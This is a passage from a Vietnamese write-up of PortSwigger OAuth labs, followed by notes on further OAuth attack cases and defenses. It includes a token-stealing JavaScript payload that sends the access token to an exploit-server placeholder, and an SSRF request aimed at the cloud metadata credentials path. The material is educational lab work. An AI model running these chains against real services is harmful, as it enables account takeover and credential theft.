Trình duyệt không gửi fragment lên server nên không thể đọc access token từ log HTTP thông thường. Cần một trang trên domain của blog để **chuyển tiếp fragment sang nơi mình kiểm soát**.

Mỗi blog post có nút "Next post" dùng tham số `path`:

```http
GET /post/next?path=/post?postId=5 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

Server redirect đến giá trị của `path`. Nếu `path` trỏ ra ngoài domain:

```
/post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/
```

Server cũng redirect ra ngoài. Đây là open redirect trong cùng domain được provider chấp nhận.

#### Xây dựng redirect_uri khai thác

Provider kiểm tra hostname, không nhất thiết kiểm tra đường dẫn. Kết hợp path traversal và open redirect:

```
redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/
```

Sau khi provider xử lý, path sau traversal là `/post/next?path=https://YOUR-EXPLOIT-ID...`. Provider redirect access token vào fragment ở URL này, sau đó server của blog redirect tiếp sang exploit server — fragment đi theo vì redirect qua `Location` giữ nguyên fragment.

#### Tạo payload và gửi cho victim

Victim đã có sẵn phiên tại provider. Khi truy cập trang exploit, cần kích hoạt authorization request; nhưng mình không thể đọc fragment trong request đến exploit server vì trình duyệt không gửi nó. Cần JavaScript đọc từ `location.hash` rồi gửi về:

```html
<script>
if (!document.location.hash) {
    window.location = 'https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/&response_type=token&nonce=RANDOM&scope=openid%20profile%20email';
} else {
    window.location = '/?'+document.location.hash.substr(1);
}
</script>
```

Luồng hoạt động:

```text
Victim truy cập exploit page
  → không có hash → chuyển hướng sang authorization request với redirect_uri đã sửa
  → Provider redirect về /post/next?path=exploit-server#access_token=...
  → Blog redirect sang exploit server/exploit/#access_token=...
  → Exploit page load lại, lần này có hash
  → Gửi /? + hash.substr(1) đến exploit server dưới dạng query string
  → Log ghi lại access_token trong query parameter
```

Đọc access log của exploit server, lấy `access_token` trong query string. Dùng token gọi `/me`:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Authorization: Bearer VICTIM-ACCESS-TOKEN
```

Response trả `apikey` của admin. Dùng giá trị đó để hoàn thành lab.

Lỗi xuất phát từ hai phía: provider cho phép `redirect_uri` có path tùy ý trong domain đã đăng ký, và blog có open redirect không giới hạn `path`. Kết hợp hai điều đó thành chuỗi rò rỉ token qua fragment.

### 5. Lab: SSRF via OpenID dynamic client registration

**Link Lab:** [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/lab-oauth-ssrf-via-openid-dynamic-client-registration)

![Đề bài yêu cầu khai thác SSRF qua dynamic client registration để lấy secret key từ metadata instance](image-10.png)

Lab này khác hẳn bốn lab trước: không cần chiếm tài khoản mà cần khai thác **SSRF** thông qua tính năng đăng ký client động của OpenID Connect.

#### Khám phá cấu hình OIDC

OAuth/OIDC server thường public metadata tại endpoint chuẩn. Thử:

```
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

Response trả về JSON mô tả toàn bộ cấu hình server. Trong đó có trường:

```json
"registration_endpoint": "https://oauth-YOUR-OAUTH-ID.oauth-server.net/reg"
```

Đây là endpoint đăng ký client theo [RFC 7591 Dynamic Client Registration](https://www.rfc-editor.org/rfc/rfc7591). Trong nhiều triển khai, endpoint này không yêu cầu xác thực — ai cũng có thể đăng ký client mới.

#### Đăng ký client với logo_uri độc hại

Khi đăng ký client OIDC, có thể khai báo `logo_uri` — địa chỉ ảnh logo của ứng dụng. Khi authorization server cần hiển thị logo tại màn hình consent, nó sẽ tải ảnh từ URL đó bằng một request phía server. Điều này tạo ra vector SSRF.

Đầu tiên xác nhận `logo_uri` có gây SSRF không bằng cách trỏ sang Burp Collaborator hoặc tương tự. Sau khi xác nhận có thể fetch ngoài, thay bằng địa chỉ metadata internal:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Response trả về client mới, bao gồm `client_id`:

```json
{
    "client_id": "NEW-CLIENT-ID",
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

#### Kích hoạt SSRF qua logo endpoint

Bây giờ cần khiến server tải logo — tức là thực hiện HTTP request đến `logo_uri`. Truy cập endpoint logo của client mới:

```http
GET /client/NEW-CLIENT-ID/logo HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

Server thực hiện request phía backend đến `http://169.254.169.254/...`, lấy nội dung IAM credentials rồi trả về response. Secret key hiện ra trong body của response.

```text
POST /reg         → đăng ký client với logo_uri trỏ vào metadata server
GET /client/.../logo → server fetch logo → SSRF → lấy credentials
```

**Tại sao không chặn được từ trước?** Bởi vì:
1. `/reg` không yêu cầu xác thực, cho phép đăng ký tùy ý.
2. Server tự động fetch `logo_uri` mà không kiểm tra đây có phải IP nội bộ không.

**Phòng chống:**
- Yêu cầu xác thực khi đăng ký client động.
- Kiểm tra và từ chối URI trỏ đến link-local (`169.254.x.x`), localhost hoặc dải private khi server phải fetch tài nguyên từ đó.
- Dùng allowlist các domain hợp lệ cho các trường URI được server tự động tải.

---

## V. Tổng kết và mối quan hệ giữa các lỗ hổng

Năm lab trên đại diện cho những điểm kiểm tra hay bị bỏ qua nhất trong một luồng OAuth:

| Lab | Điểm kiểm tra bị bỏ sót | Hệ quả |
| --- | --- | --- |
| 1. Implicit bypass | Client tin email do browser khai, không đối chiếu với token | Đăng nhập tài khoản bất kỳ |
| 2. Forced linking | Thiếu `state`, callback không ràng buộc với phiên khởi tạo | Ghép social profile attacker vào tài khoản admin |
| 3. Redirect URI leak | Provider không kiểm tra `redirect_uri` | Đánh cắp authorization code của victim |
| 4. Open redirect + token | Provider cho phép path tùy ý; blog có open redirect | Đánh cắp access token qua chuỗi redirect và fragment |
| 5. SSRF via registration | `/reg` không xác thực; server tự fetch `logo_uri` | SSRF lấy credentials nội bộ |

Không có lỗ hổng nào đứng một mình hoàn toàn. Lab 4 cần cả lỗi kiểm tra URI ở provider lẫn open redirect ở client. Lab 5 cần cả endpoint đăng ký mở lẫn server tự fetch URL tùy ý. Điều này phản ánh thực tế: khai thác OAuth thường là chuỗi điều kiện nhỏ kết hợp lại, không phải một lỗi duy nhất rõ ràng.

Khi đánh giá một luồng OAuth, mình thường đi theo thứ tự:

1. **Xác định grant type** — implicit hay code, PKCE có không?
2. **Kiểm tra `redirect_uri`** — provider có whitelist chặt chẽ hay chỉ kiểm tra domain?
3. **Tìm `state`** — có không, được kiểm tra đúng không, gắn với phiên không?
4. **Theo dõi nơi token đi** — qua fragment, qua query, hay chỉ tồn tại server-side?
5. **Tìm endpoint liên quan đến OIDC** — `/reg`, `/.well-known/openid-configuration`, logo endpoint.
6. **Kiểm tra các luồng phụ** — account linking, remember me, consent được ghi nhớ.

Mỗi điểm đó có thể ổn khi đứng riêng nhưng trở nên nguy hiểm khi kết hợp với một điều kiện khác. Đây cũng là lý do các checklist đơn thuần không thay thế được việc hiểu cơ chế từng bước.

---

## VI. Mở rộng: Các case hay gặp ngoài lab

### 1. Token leakage qua Referer header

Implicit flow để lại access token trong URL fragment. Khi JavaScript trên trang callback dùng `window.location.href` hoặc `window.location.replace` để điều hướng sang trang khác, một số trình duyệt và thư viện đưa URL đầy đủ — kể cả fragment — vào header `Referer` của request tiếp theo.

```text
Browser nhận:
  Location: https://client.example/callback#access_token=TOKEN&token_type=Bearer

JS trên /callback điều hướng:
  window.location.href = "https://client.example/dashboard";

Request tới /dashboard:
  GET /dashboard HTTP/1.1
  Host: client.example
  Referer: https://client.example/callback#access_token=TOKEN&token_type=Bearer
```

Server nhận được `Referer` đầy đủ. Nếu `/dashboard` load tài nguyên từ third-party (analytics, CDN, font), những request đó cũng mang `Referer` đó sang domain ngoài.

Rủi ro tương tự xảy ra khi trang có thẻ `<a href="https://external.example">`. Click vào đó sẽ gửi `Referer` chứa token sang `external.example`.

**Cách giảm thiểu ở phía client:**

- Dùng `history.pushState` để xóa fragment khỏi URL ngay sau khi đọc xong token, trước bất kỳ điều hướng nào.
- Đặt `<meta name="referrer" content="no-referrer">` hoặc dùng `Referrer-Policy: no-referrer` để browser không gửi Referer.
- Tốt hơn cả: không dùng implicit flow; chuyển sang Authorization Code + PKCE.

### 2. Scope escalation

OAuth scopes định nghĩa quyền truy cập được cấp. Có hai hướng tấn công liên quan đến scope:

#### 2a. Xin scope nhiều hơn được khai báo

Client đăng ký với provider rằng mình cần scope `profile email`. Tuy nhiên, authorization request có thể xin thêm scope không được đăng ký:

```http
GET /auth?client_id=CLIENT&scope=profile%20email%20admin HTTP/1.1
```

Nếu provider không kiểm tra scope so với danh sách đã đăng ký của client mà chỉ hỏi user, user có thể vô tình cấp quyền `admin` cho một ứng dụng bình thường. Một số provider chấp nhận và cấp token với scope được mở rộng.

#### 2b. Dùng token ở context có quyền cao hơn scope được cấp

Access token được cấp với `scope=read` được gửi đến một endpoint chỉ kiểm tra token hợp lệ, không kiểm tra scope trong token:

```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer READ-ONLY-TOKEN
```

Resource server trả về dữ liệu vì chỉ xác minh chữ ký token, không đọc claim `scope`. Lỗi này thuộc về resource server, không phải provider.

**Kiểm tra khi pentest:**
1. Thêm các scope đặc quyền vào authorization request và quan sát phản hồi.
2. Dùng token scope thấp để gọi endpoint đặc quyền — nếu resource server không reject là có lỗi.
3. Thử scope của ứng dụng khác cùng provider (cross-client scope escalation).

**Phòng chống:**
- Provider chỉ cấp scope nằm trong whitelist đã đăng ký của client.
- Resource server phải kiểm tra claim `scope` trong token trước khi cho phép truy cập endpoint.

### 3. Account pre-hijacking

Pre-hijacking xảy ra khi attacker tạo trước một tài khoản với email của victim — trước khi victim tự đăng ký. Khi victim sau đó đăng ký hoặc đăng nhập bằng OAuth, ứng dụng có thể merge hai tài khoản lại hoặc để attacker tiếp tục truy cập.

Nghiên cứu năm 2022 của Sudhodanan và Paverd ([USENIX Security 2022](https://arxiv.org/abs/2205.10174)) kiểm tra 75 dịch vụ phổ biến và phát hiện 35 trong số đó (47%) có ít nhất một biến thể tấn công này.

Có ba biến thể chính:

#### 3a. Classic pre-hijacking

Ứng dụng cho phép đăng ký bằng email/password và đăng nhập bằng OAuth (Google, GitHub...). Khi đăng nhập OAuth, ứng dụng tra email từ OAuth profile và nếu đã có tài khoản trùng email thì đăng nhập vào tài khoản đó.

```text
Attacker đăng ký: email=victim@gmail.com, password=attacker-chosen
Victim đăng nhập OAuth bằng victim@gmail.com
  → ứng dụng tìm thấy tài khoản trùng email
  → merge hoặc đăng nhập vào tài khoản attacker đã tạo
  → Attacker vẫn có thể dùng password cũ để vào
```

Điều kiện: ứng dụng không verify email sau đăng ký email/password; và merge tài khoản dựa trên email mà không xác nhận.

#### 3b. Unexpired session sau OAuth linking

Attacker tạo tài khoản, đăng nhập, giữ session hợp lệ. Victim dùng "Forgot password" hoặc đăng nhập OAuth với cùng email — nếu ứng dụng không invalidate session cũ sau khi tài khoản được takeover/merge, session của attacker vẫn hoạt động.

#### 3c. Unverified OAuth provider claim

Một số OAuth provider trả về `email_verified: false` khi email chưa được xác nhận. Nếu ứng dụng dùng email từ OAuth mà không kiểm tra `email_verified`, attacker có thể tạo OAuth account với email chưa verify trùng với email của victim.

```json
{
    "sub": "attacker-sub",
    "email": "victim@example.com",
    "email_verified": false
}
```

Ứng dụng merge tài khoản dựa trên email mà không quan tâm email có được xác thực bởi provider không.

**Phòng chống:**
- Luôn verify email khi đăng ký bằng email/password trước khi kích hoạt tài khoản.
- Khi merge tài khoản theo email từ OAuth, chỉ tin `email` khi `email_verified: true`.
- Invalidate toàn bộ session cũ khi tài khoản được merge hoặc liên kết với provider mới.
- Thông báo cho user hiện tại khi có tài khoản OAuth mới được liên kết với email của họ.

### 4. Refresh token leakage và rotation bypass

Refresh token tồn tại lâu hơn access token nhiều. Nếu bị lộ, attacker có thể xin access token mới vô thời hạn mà không cần user đăng nhập lại.

#### Lộ qua log và error response

Một số triển khai log toàn bộ request/response tại token endpoint, bao gồm cả refresh token trong body. Nếu attacker có quyền đọc log ứng dụng hoặc log proxy nội bộ, đây là điểm rò rỉ.

Error response cũng có thể phản ánh lại giá trị nhận được:

```json
{
    "error": "invalid_grant",
    "error_description": "Refresh token 'ACTUAL-TOKEN-VALUE' has expired"
}
```

#### Refresh token rotation bypass

Nhiều provider implement **refresh token rotation**: mỗi lần dùng refresh token là nhận token mới, token cũ bị thu hồi. Điều này giúp phát hiện reuse: nếu token cũ được dùng lại sau khi đã rotation, provider biết có rò rỉ.

Tuy nhiên có race condition: nếu client gửi hai request refresh token đồng thời (network retry), provider có thể cấp hai token khác nhau từ cùng một token cũ. Chỉ một trong hai được giữ lại, còn lại bị vô hiệu. Nếu attacker biết timing, họ có thể lợi dụng cửa sổ này.

Quan trọng hơn: nếu provider **không implement rotation**, mọi nơi refresh token xuất hiện đều là điểm rủi ro lâu dài — khác với access token ngắn hạn, thiệt hại kéo dài đến khi user đổi mật khẩu hoặc revoke.

```http
POST /token HTTP/1.1
Host: auth.example

grant_type=refresh_token&refresh_token=STOLEN-REFRESH-TOKEN&client_id=CLIENT

→ Response: access_token mới, có thể kèm refresh_token mới
```

**Phòng chống:**
- Implement refresh token rotation và phát hiện reuse.
- Không log request body tại token endpoint.
- Scope refresh token tối thiểu cần thiết.
- Cho phép user xem và revoke từng phiên đang hoạt động.
